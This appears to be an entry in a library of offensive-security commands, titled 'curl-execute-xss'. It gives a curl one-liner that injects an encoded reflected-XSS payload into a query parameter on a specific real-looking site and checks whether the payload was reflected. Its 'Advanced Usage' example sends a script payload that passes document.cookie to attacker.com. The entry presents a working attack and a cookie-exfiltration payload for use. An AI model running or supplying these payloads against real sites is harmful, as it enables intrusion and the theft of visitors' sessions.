---
data: >-
  curl -s
  "https://videostore.mtnonline.com/GL/MyAccount.aspx?PId=126&CID=5&OprId=11%27%3E%3Cinput%20onfocus=eval(atob(%27YWxlcnQoJ1hTUycp%27))%20autofocus%3E"
  > response.html && grep -i "input onfocus" response.html
tags:
  - xss
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:08.308Z'
id: 0b257ff7-7151-4f71-9d67-0f4d229792dc
verified: false
validated: true
submitted: true
---
# curl-execute-xss

## Command

```bash
curl -s "https://videostore.mtnonline.com/GL/MyAccount.aspx?PId=126&CID=5&OprId=11%27%3E%3Cinput%20onfocus=eval(atob(%27YWxlcnQoJ1hTUycp%27))%20autofocus%3E" > response.html && grep -i "input onfocus" response.html
```

## Description

This command fetches the page with a crafted XSS payload using curl, saves the response to HTML, and greps for the injected input element to verify payload insertion. Open response.html in a browser to trigger the JS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode | Yes |
| URL | Malicious URL with encoded payload | Yes |
| `> response.html` | Saves output to file | Yes |
| `grep -i "input onfocus"` | Checks for injected element | Yes |

## Examples

### Basic Usage

```bash
curl -s "https://videostore.mtnonline.com/GL/MyAccount.aspx?PId=126&CID=5&OprId=11%27%3E%3Cinput%20onfocus=eval(atob(%27YWxlcnQoJ1hTUycp%27))%20autofocus%3E" > response.html && grep -i "input onfocus" response.html
```

### Advanced Usage

```bash
curl -s "https://target.com/page.aspx?param=%27%3E%3Cscript%3Efetch('http://attacker.com?'+document.cookie)%3C/script%3E" | head -n 20
```

## Expected Output

Grep shows <input onfocus=...> if injected. In browser, alert('XSS') triggers on focus/autofocus.

## Related

- [[Related Procedure: Craft and Execute XSS Payload]]
